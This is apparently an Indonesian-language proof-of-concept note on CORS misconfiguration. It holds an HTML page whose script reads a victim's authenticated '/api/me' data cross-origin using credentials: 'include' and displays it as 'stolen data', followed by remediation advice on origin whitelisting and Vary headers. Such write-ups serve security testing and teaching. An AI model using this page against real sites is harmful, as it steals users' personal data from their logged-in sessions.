# PoC

***

### Contoh Kode

```html
<html>
  <body>
    <h2>CORS PoC by Ihsan</h2>
    <script>
      async function exploit() {
        try {
          // Perintah kuncinya adalah "credentials: 'include'"
          const response = await fetch('https://target.example.com/api/me', {
            method: 'GET',
            credentials: 'include'
          });

          const data = await response.json();

          // Tampilkan data curian di konsol penjahat (atau kirim ke server penjahat)
          console.log('Data Berhasil Dicuri:');
          console.log(JSON.stringify(data));
          
          // Tampilkan di halaman untuk demo
          document.getElementById('data').innerText = JSON.stringify(data, null, 2);

        } catch (error) {
          console.error('Gagal:', error);
          document.getElementById('data').innerText = 'Gagal mengambil data. Cek konsol.';
        }
      }
      
      exploit();
    </script>
    <h3>Data yang Dicuri:</h3>
    <pre id="data">Mengambil data...</pre>
  </body>
</html>
```

***

### Saran Perbaikan

* Jangan Memantulkan `Origin`: Jangan pernah menyalin nilai `Origin` dari request ke `Access-Control-Allow-Origin`.
* Gunakan Whitelist Ketat: Definisikan secara manual daftar lengkap domain yang _benar-benar_ diizinkan. Contoh: `Access-Control-Allow-Origin: https://app.target.example.com`.
* Jangan Izinkan `null`: Jangan pernah menambahkan `null` ke whitelist.
* Gunakan `Vary: Origin`: Selalu tambahkan header respons `Vary: Origin`. Ini mencegah _cache_ perantara membocorkan respons ke pengguna yang salah.
